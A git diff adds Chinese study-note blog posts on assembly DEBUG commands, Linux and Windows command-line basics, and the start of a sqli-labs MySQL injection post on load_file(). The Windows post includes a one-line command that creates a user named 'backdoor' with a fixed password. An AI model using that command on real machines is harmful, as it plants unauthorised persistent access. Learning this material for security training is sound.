@@ -353,6 +353,801 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/18/汇编-debug的基础指令/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/18/汇编-debug的基础指令/" class="post-title-link" itemprop="url">Unbenannt</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-03-18 15:20:08 / Updated at: 21:48:03" itemprop="dateCreated datePublished" datetime="2019-03-18T15:20:08+08:00">2019-03-18</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>title: 汇编-debug的基础指令<br>date: 2019-03-18 15:20:08<br>tags:<br>categories: 汇编</p>
+<p>debug的使用：</p>
+<p>可以使用debug查看CPU各种寄存中的内容，内存的情况和在机器码级跟踪程序的运行。</p>
+<p>debug的使用：</p>
+<p>可以使用debug查看CPU各种寄存中的内容，内存的情况和在机器码级跟踪程序的运行。</p>
+<p>debug功能：（常见的六个）</p>
+<p>R命令：查看、改变CPU寄存器的内容</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/r1.png" alt="r1"></p>
+<p> <img src="/2019/03/18/汇编-debug的基础指令/r2.png" alt="r2"></p>
+<p>D命令：查看内存中的内容</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/d1.png" alt="d1"></p>
+<p>左边是内存地址 ，内存地址中的对应的内容 右边是ASCII编码 （数字符号，英语字母，标点符号）</p>
+<p>展示128个字节</p>
+<p>也可以使用下面的指令修改</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/d2.png" alt="d2"></p>
+<p>使用d命令只当查看范围后，接着使用d命令，可列出后续的内容</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/d3.png" alt="d3"></p>
+<p>U命令：将内存中的机器指令翻译成汇编指令</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/u1.png" alt="u1"></p>
+<p> <img src="/2019/03/18/汇编-debug的基础指令/u2.png" alt="u2"></p>
+<p>A指令：以汇编指令的格式在内存中写入一条机器指令</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/a1.png" alt="a1"></p>
+<p>可以在指定位置写入</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/a2.png" alt="a2"></p>
+<p>T指令：执行一条及其指令</p>
+<p>执行的位置是cs：ip指向的位置</p>
+<p>例如我们要执行 2000：0 位置的指令</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/t1.png" alt="t1"></p>
+<p>之后就可以执行</p>
+<p> <img src="/2019/03/18/汇编-debug的基础指令/t2.png" alt="t2"></p>
+<p>E命令：改写内存中的内容</p>
+<p>方式1：</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/e1.png" alt="e1"></p>
+<p>方式2：以提问式的方式</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/e2.png" alt="e2"></p>
+<ol>
+<li><p>输入e 2000：0 之后回车，将显示起始地址（图中为2000：0000）和第一个单元（2000：0000）的原始内容（B8），光标将会出现在“.”的后面，</p>
+</li>
+<li><p>此时输入值然后空格可改写原有的内容；不输入直接空格表示不对当前单元改写。</p>
+</li>
+<li><p>输入空格后将自动跳到下一个单元。</p>
+</li>
+<li><p>改写完毕后回车结束e命令</p>
+</li>
+</ol>
+<p>e指令还可以结合ASCLL码使用</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/e3.png" alt="e3"></p>
+<p>可以看到存到内存中的是字符对应的ASCLL码</p>
+<p>例如 0对应30H（十进制的48） a对应61H（十进制的97）A对应41H（十进制的65）</p>
+<p>小知识： 可以按住alt键打出ASCLL码指对应的符号  </p>
+<p>按住alt 输入48 松开 alt，就打出了0, 写65 可以输出对应A </p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/e4.png" alt="e4"></p>
+<p>我们还可以用e命令向内存中写入字符串</p>
+<p>使用e命令向内存中写入机器码，然后用u指令翻译成汇编指令</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/e5.png" alt="e5"></p>
+<p>补充：</p>
+<p>g命令与p命令</p>
+<p>G命令的使用方法是：G [=起始地址]  [断点地址]，意思是从起始地址开始执行到断点地址。如果不设置断点，则程序一直运行到中止指令才停止。</p>
+<p>例如：g 0012 表示将debug从当前的CS:IP指向的指令执行，一直到(IP)=0012h为止</p>
+<p>实例：</p>
+<p>在设置完内存数据并且输入完程序后运行这些汇编代码。在DEBUG中执行命令G=100，观看运行结果。</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/g1.png" alt="g1"></p>
+<p>汇编程序运行后在屏幕上显示出“ABCD”四个字符。</p>
+<p>接下来在DEBUG中执行G=100 10B，意思是从地址CS：100开始，一直运行到CS：10B停止。观看运行结果。</p>
+<p>命令执行后，不但显示出字符串“ABCD”，而且列出当前寄存器和标志位的值。</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/g2.png" alt="g2"></p>
+<p>g命令在loop中的使用：</p>
+<p>使用loop循环时，如果要运行到跳出循环执行后面的代码，（即不用一次次按t一步步执行循环到循环结束）可以先用u命令查看代码的偏移地址，在用g命令跳转到此偏移到此代码处，如下：</p>
+<p><img src="/2019/03/18/汇编-debug的基础指令/g3.jpg" alt="g3"></p>
+<p>用u命令可以看到循环的命令后的地址位于0b40:000B，所以要跳出循环就用 g 000B 即可</p>
+<p>p指令</p>
+<p>使用p指令，debug就会自动重复执行循环中的指令，直到（cx）=0为止</p>
+<p>转移指令</p>
+<p>jmp</p>
+<p>call  将读取该指令后改变的ip保存下来，并执行跳转  ret从内存中拿回保存的地址</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/28/linux命令应用/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/28/linux命令应用/" class="post-title-link" itemprop="url">linux命令应用</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-02-28 20:41:27" itemprop="dateCreated datePublished" datetime="2019-02-28T20:41:27+08:00">2019-02-28</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-03-02 19:32:21" itemprop="dateModified" datetime="2019-03-02T19:32:21+08:00">2019-03-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令/" itemprop="url" rel="index"><span itemprop="name">命令</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="使用命令行下载git项目文件"><a href="#使用命令行下载git项目文件" class="headerlink" title="使用命令行下载git项目文件"></a>使用命令行下载git项目文件</h1><p>//在终端使用命令行  git clone git://远程Git库地址  filename<br>filename 是你本地的文件夹名字将远程库克隆到这个文件夹，此文件是自己建立的，    filename默认为在主文件夹的home里面</p>
+<p>例如：<br>请通过git命令，下载<a href="https://github.com/sqlmapproject/sqlmap.git项目文件？" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git项目文件？</a></p>
+<pre><code>Git clone https://github.com/sqlmapproject/sqlmap.git
+</code></pre><h1 id="通过命令将http-www-xxx-com-test-zip下载至本地"><a href="#通过命令将http-www-xxx-com-test-zip下载至本地" class="headerlink" title="通过命令将http://www.xxx.com/test.zip下载至本地"></a>通过命令将<a href="http://www.xxx.com/test.zip下载至本地" target="_blank" rel="noopener">http://www.xxx.com/test.zip下载至本地</a></h1><p>wget是linux下一个从网络上自动下载文件的常用自由工具。它支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。一般的使用方法是: wget + 空格 + 参数 + 要下载文件的url路径，例如：</p>
+<p>wget <a href="http://www.linuxsense.org/xxxx/xxx.tar.gz" target="_blank" rel="noopener">http://www.linuxsense.org/xxxx/xxx.tar.gz</a><br>-c参数, 这个也非常常见, 可以断点续传, 如果不小心终止了, 可以继续使用命令接着下载，例如：</p>
+<p>wget -c <a href="http://www.linuxsense.org/xxxx/xxx.tar.gz" target="_blank" rel="noopener">http://www.linuxsense.org/xxxx/xxx.tar.gz</a></p>
+<p>Wget常用参数<br>-b：后台下载，Wget默认的是把文件下载到当前目录。<br>-O：将文件下载到指定的目录中。<br>-P：保存文件之前先创建指定名称的目录。<br>-t：尝试连接次数，当Wget无法与服务器建立连接时，尝试连接多少次。<br>-c：断点续传，如果下载中断，那么连接恢复时会从上次断点开始下载。<br>-r：使用递归下载</p>
+<h1 id="查看文件的行数"><a href="#查看文件的行数" class="headerlink" title="查看文件的行数"></a>查看文件的行数</h1><p>在 linux 系统中没有在 windows 系统中那么方便的点点鼠标就可以操作文件了，对文件的各种操作都必须使用各种命令来完成。比如有时候我们需要在不查看文件内容的情况下需要知道该文件有多少行。这个时候可以通过 linux 的 wc 命令完成我们的想法。下面具体介绍一下 wc 命令的作用以及用法。</p>
+<p>wc 命令的作用：统计指定文件中的字节数、字数、行数，并将结果显示输出。</p>
+<p>命令语法：wc [选项] 文件</p>
+<p>该命令选项参数如下： </p>
+<p>-c 统计字节数</p>
+<p>-l 统计行数</p>
+<p>-w 统计字数</p>
+<p>-m 统计字符数</p>
+<p>以上选项可以单独使用也可以组合使用。注意组合使用时输出结果的列的顺序和数目不受选项的顺序和数目的影响。输出结果总是按下述顺序进行显示的。</p>
+<p>行数 字数 字节数 文件名</p>
+<p>例如： </p>
+<p>wc -lcw file1 file2</p>
+<p>则输出结果为：</p>
+<p>9 36 file1 </p>
+<p>8 62 file2 </p>
+<p>8 24 96 total</p>
+<p>省略任选项-lcw，wc命令的执行结果与上面是一样的。</p>
+<p>以上选项也可以单独使用，例如：</p>
+<p>wc -l filename 输出 filename 的行数</p>
+<p>wc -c filename 输出 filename 的字节数</p>
+<p>wc -m filename 输出 filename 的字符数</p>
+<p>wc -w filename 输出 filename 的单词数</p>
+<p>wc -L filename 输出 filename 文件里最长的那一行是多少个字符数</p>
+<h1 id="linux下查找某个文件位置的方法"><a href="#linux下查找某个文件位置的方法" class="headerlink" title="linux下查找某个文件位置的方法"></a>linux下查找某个文件位置的方法</h1><h2 id="全局查找"><a href="#全局查找" class="headerlink" title="全局查找"></a>全局查找</h2><p>例如查找httpd.conf这个文件<br>find / -name httpd.conf<br>　　这个命令语法看起来很容易就明白了，就是直接在find后面写上 -name，表明要求系统按照文件名查找，最后写上httpd.conf这个目标文件名即可。稍等一会系统会在计算机屏幕上显示出查找结果列表：<br>　　etc/httpd/conf/httpd.conf<br>　　这就是httpd.conf这个文件在Linux系统中的完整路径。查找成功。</p>
+<h2 id="指定目录下查找"><a href="#指定目录下查找" class="headerlink" title="指定目录下查找"></a>指定目录下查找</h2><p>如果我们在整个硬盘，这个系统中查找某个文件就要花费相当长的一段时间，特别是大型Linux系 统和容量较大的硬盘，文件放在套嵌很深的目录中的时候。如果我们知道了这个文件存放在某个大的目录中，那么只要在这个目录中往下找就能节省很多时间了。使用find /etc -name httpd.conf就可以解决这个问题。上面的命令就是表示在etc目录中查询httpd.conf这个文件。这里再说明一下“/”这个函数符号的含 义，如果输入“find /”就是表示要求Linux系统在整个ROOT目录下查找文件，也就是在整个硬盘上查找文件，而“find /etc”就是只在<br>etc目录下查找文件。因为“find /etc”表示只在etc目录下查找文件，所以查找的速度就相应要快很多了</p>
+<h2 id="根据部分文件名查找方法："><a href="#根据部分文件名查找方法：" class="headerlink" title="根据部分文件名查找方法："></a>根据部分文件名查找方法：</h2><p>　例如我们知道某个文件包含有srm这3个字母，那么要找到系统中所有包含有这3个字母的文件是可以实现 的，输入：<br>　　find /etc -name ‘<em>srm</em>‘<br>　　这个命令表明了Linux系统将在/etc整个目录中查找所有的包含有srm这3个字母的文件，比如absrmyz，tibc.srm等等符合条件的文件都能显示出来。如果你还知道这个文件是由srm 这3个字母打头的，那么我们还可以省略最前面的星号，命令如下：<br>　　find/etc -name ‘srm*’</p>
+<h2 id="根据文件的特征查询方法："><a href="#根据文件的特征查询方法：" class="headerlink" title="根据文件的特征查询方法："></a>根据文件的特征查询方法：</h2><p>　　例如我们知道一个Linux文件大小为1,500bytes，那么我们可是使用如下命令来查询find /-size<br>1500c，字符c表明这个要查找的文件的大小是以bytes为单位。如果我们连这个文件的具体大小都不知道，那么在Linux中还可以进行模糊查找方式 来解决。例如我们输入find /-size+10000000c这个命令，则标明我们指定系统在根目录中查找出大于10000000字节的文件并显示出来。命令中的“＋”是表示要求系 统只列出大于指定大小的文件，而使用“-”则表示要求系统列出小于指定大小的文件。下面的列表就是在Linux使用不同“find”命令后系统所要作出的 查找动作，从中我们很容易看出在Linux中使用“find”命令的方式是很多的，“find”命令查找文件只要灵活应用，丝毫不比在WINDOWS中查 找能力差。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find / -amin -10 # 查找在系统中最后10分钟访问的文件 </span><br><span class="line">　　find / -atime -2 # 查找在系统中最后48小时访问的文件 </span><br><span class="line">　　find / -empty # 查找在系统中为空的文件或者文件夹 </span><br><span class="line">　　find / -group cat # 查找在系统中属于groupcat的文件 </span><br><span class="line">　　find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件 </span><br><span class="line">　　find / -mtime -1 #查找在系统中最后24小时里修改过的文件 </span><br><span class="line">　　find / -nouser #查找在系统中属于作废用户的文件 </span><br><span class="line">　　find / -user fred #查找在系统中属于FRED这个用户的文件</span><br></pre></td></tr></table></figure></p>
+<p>　　下面的列表就是对find命令所可以指定文件的特征进行查找的部分条件。在这里并没有列举所有的查找条件，参考有关Linux有关书籍可以知道所有find命令的查找函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">　　-amin n </span><br><span class="line">　　查找系统中最后N分钟访问的文件 </span><br><span class="line">　　-atime n </span><br><span class="line">　　查找系统中最后n*24小时访问的文件 </span><br><span class="line">　　-cmin n </span><br><span class="line">　　查找系统中最后N分钟被改变状态的文件 </span><br><span class="line">　　-ctime n </span><br><span class="line">　　查找系统中最后n*24小时被改变状态的文件 </span><br><span class="line">　　-empty </span><br><span class="line">　　查找系统中空白的文件，或空白的文件目录，或目录中没有子目录的文件夹 </span><br><span class="line">　　-false </span><br><span class="line">　　查找系统中总是错误的文件 </span><br><span class="line">　　-fstype type </span><br><span class="line">　　查找系统中存在于指定文件系统的文件，例如：ext2 . </span><br><span class="line">　　-gid n </span><br><span class="line">　　查找系统中文件数字组 ID 为 n的文件 </span><br><span class="line">　　-group gname </span><br><span class="line">　　查找系统中文件属于gnam文件组，并且指定组和ID的文件。</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/27/windows命令应用/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/27/windows命令应用/" class="post-title-link" itemprop="url">windows命令应用</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-02-27 22:42:46" itemprop="dateCreated datePublished" datetime="2019-02-27T22:42:46+08:00">2019-02-27</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-03-02 19:34:55" itemprop="dateModified" datetime="2019-03-02T19:34:55+08:00">2019-03-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令/" itemprop="url" rel="index"><span itemprop="name">命令</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="如何用DOS命令查看占用某端口的程序及PID号"><a href="#如何用DOS命令查看占用某端口的程序及PID号" class="headerlink" title="如何用DOS命令查看占用某端口的程序及PID号"></a>如何用DOS命令查看占用某端口的程序及PID号</h1><p>输入命令“ netstat  -aon|findstr  “80” ”后按回车显示如下，可以看到占用80端口对应的程序的PID号为2320：<br><img src="/2019/02/27/windows命令应用/占用某端口的程序1.png" alt=""><br>根据PID号找到对应的程序：继续输入命令“tasklist|findstr “2448””，按回车后显示如下，可以看出2320对应的程序为360tray，这也说明该程序正在使用80端口：<br><img src="/2019/02/27/windows命令应用/占用某端口的程序2.png" alt=""></p>
+<p>若想80端口不被占用，则需要在任务管理器中结束相应的进程，按快捷键“Ctrl+Shift+Esc”调出Windows任务管理器，找到“360tray”，单击下方的结束进程即可！</p>
+<p>结束进程时要注意，若不熟悉的进程最好不要随意结束，否则可能会出现不可预测的错误；</p>
+<h1 id="Windows下如何用命令查看PID进程和杀掉该进程"><a href="#Windows下如何用命令查看PID进程和杀掉该进程" class="headerlink" title="Windows下如何用命令查看PID进程和杀掉该进程"></a>Windows下如何用命令查看PID进程和杀掉该进程</h1><p>1.提供查看PID进程的命令：<br>例如： tasklist|findstr “2396”</p>
+<p>taskkill /f /t /im tor.exe<br>例如： ntsd -c q -p pid 2396或者taskkill/pid 2396<br><img src="/2019/02/27/windows命令应用/占用某端口的程序3.png" alt=""><br>可以用taskkill命令直接结束，后面加/f，表示强制结束，不提示错误。<br><img src="/2019/02/27/windows命令应用/占用某端口的程序4.png" alt=""></p>
+<h1 id="输出重定向（-gt-）和输出追加重定向（-gt-gt-）"><a href="#输出重定向（-gt-）和输出追加重定向（-gt-gt-）" class="headerlink" title="输出重定向（&gt;）和输出追加重定向（&gt;&gt;）"></a>输出重定向（&gt;）和输出追加重定向（&gt;&gt;）</h1><p>echo &gt; 和 echo &gt;&gt;的区别  和Linux 一样<br><img src="/2019/02/27/windows命令应用/输出重定向和输出追加重定向.PNG" alt=""></p>
+<h1 id="windows获取文件夹下所有文件名的方法"><a href="#windows获取文件夹下所有文件名的方法" class="headerlink" title="windows获取文件夹下所有文件名的方法"></a>windows获取文件夹下所有文件名的方法</h1><p>方法一：tree命令</p>
+<p>TREE——显示磁盘目录结构命令</p>
+<p>功能：显示指定驱动器上所有目录路径和这些目录下的所有文件名。</p>
+<p>格式：TREE [盘符：][\目录] [/F] [/A]<br><img src="/2019/02/27/windows命令应用/tree.PNG" alt=""><br>　　使用说明：使用/F参数时显示所有目录及目录下的所有文件，省略时，只显示目录，不显示目录下的文件；</p>
+<p>　　使用/A参数时，不是用Ascii码大于127（NT为255）的字符显示，是用Ascii码小于128的字符显示。<br>还能通过&gt;  将结果保存在一个文本中而不是显示在命令窗口<br><img src="/2019/02/27/windows命令应用/tree2.PNG" alt=""><br>方法二：dir命令<br>/s 是指列出当前目录包含子目录下的所有文件</p>
+<p>/b 是仅列出文件名称，而日期、大小等其它信息则忽略<br><img src="/2019/02/27/windows命令应用/dir.PNG" alt=""><br>同样也可以使用&gt;将结果保存在一个文本中而不是显示在命令窗口<br><img src="/2019/02/27/windows命令应用/dir2.PNG" alt=""><br>dir D: /s/b &gt; E:/contents.xls   这样可以直接把D盘下的文件名都提取出来并创建contents.xls存放到E盘的根目录下。<br><img src="/2019/02/27/windows命令应用/dir3.PNG" alt=""></p>
+<h1 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h1><p>（包含已打补丁、开机运行时间等等）的命令<br>输入“systeminfo”命令，即可看到安装时间。<br><img src="/2019/02/27/windows命令应用/info.png" alt=""><br>运行时间也可以</p>
+<p>1、右键点击桌面底部任务栏，再点击“启动任务管理器”；</p>
+<p>2、在“任务管理器”窗口，点击“性能”选项卡；</p>
+<p>3、在“性能”界面，右下边便可以看见系统运行时间。</p>
+<h1 id="文件（夹）创建与删除"><a href="#文件（夹）创建与删除" class="headerlink" title="文件（夹）创建与删除"></a>文件（夹）创建与删除</h1><h2 id="文件创建"><a href="#文件创建" class="headerlink" title="文件创建"></a>文件创建</h2><p>一般创建空文件用 type  创建非空用echo</p>
+<h3 id="echo创建文件"><a href="#echo创建文件" class="headerlink" title="echo创建文件"></a>echo创建文件</h3><p><img src="/2019/02/27/windows命令应用/echo.PNG" alt=""></p>
+<h3 id="使用type创建一个文本"><a href="#使用type创建一个文本" class="headerlink" title="使用type创建一个文本"></a>使用type创建一个文本</h3><p><img src="/2019/02/27/windows命令应用/type.PNG" alt=""></p>
+<h3 id="使用fsutil-创建一个文件大小为3000比特的文本"><a href="#使用fsutil-创建一个文件大小为3000比特的文本" class="headerlink" title="使用fsutil 创建一个文件大小为3000比特的文本"></a>使用fsutil 创建一个文件大小为3000比特的文本</h3><p>fsutil file createNew D:\new.text\f.text 3000<br>此时为空文件<br>fsutil file createNew  dir D:/ &gt;D:\new.text\fsu.text 3000<br>此时文件内有固定的文字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用法 : fsutil file createNew &lt;filename&gt; &lt;length&gt;</span><br><span class="line">例如 : fsutil file createNew C:\testfile.txt 1000</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/02/27/windows命令应用/f.PNG" alt=""></p>
+<h2 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h2><p>我们可以使用 md <foldername>或mkdir <foldername>命令来创建，其中md和mkdir都是建立新目录make directory的意思，完整命令是md [盘符:][路径]新目录名，<br>比如：md c:\test\myfolder<br><img src="/2019/02/27/windows命令应用/md.PNG" alt=""></foldername></foldername></p>
+<h2 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h2><p>使用rd或rmdir命令，完整命令rd /s /q [盘符:][路径]新目录名，因为rd只能删除空的文件夹，而如果其中有子文件或子文件夹的时候就会停下来<br><img src="/2019/02/27/windows命令应用/rd.PNG" alt=""><br>这时我们加上/s就可以直接删除，但是删除过程中会提示你是否确定删除<br><img src="/2019/02/27/windows命令应用/rd2.PNG" alt=""><br>对于懒癌患者我们有添加了/q，即quiet，安静模式；所以使用以上命令会完整删除你选中的整个文件夹<br><img src="/2019/02/27/windows命令应用/rd3.PNG" alt=""></p>
+<h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p><img src="/2019/02/27/windows命令应用/del.PNG" alt=""></p>
+<h1 id="创建用户，并设置密码"><a href="#创建用户，并设置密码" class="headerlink" title="创建用户，并设置密码"></a>创建用户，并设置密码</h1><p>创建一个backdoor用户，密码为backdoor123，命令是？<br>Net user backdoor backdoor123/add</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/" class="post-title-link" itemprop="url">mysql注入知识03导入导出相关操作及less7-less8</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-02-26 23:03:06 / Updated at: 23:14:25" itemprop="dateCreated datePublished" datetime="2019-02-26T23:03:06+08:00">2019-02-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Mysql注入-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Mysql注入-sqlilabs</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="导入导出相关操作的讲解"><a href="#导入导出相关操作的讲解" class="headerlink" title="导入导出相关操作的讲解"></a>导入导出相关操作的讲解</h1><h2 id="load-file-导出文件-Load-file-file-name-读取文件并返回该文件的内容作为一个字符串。-使用条件："><a href="#load-file-导出文件-Load-file-file-name-读取文件并返回该文件的内容作为一个字符串。-使用条件：" class="headerlink" title="load_file()导出文件 Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 使用条件："></a>load_file()导出文件 Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 使用条件：</h2><ul>
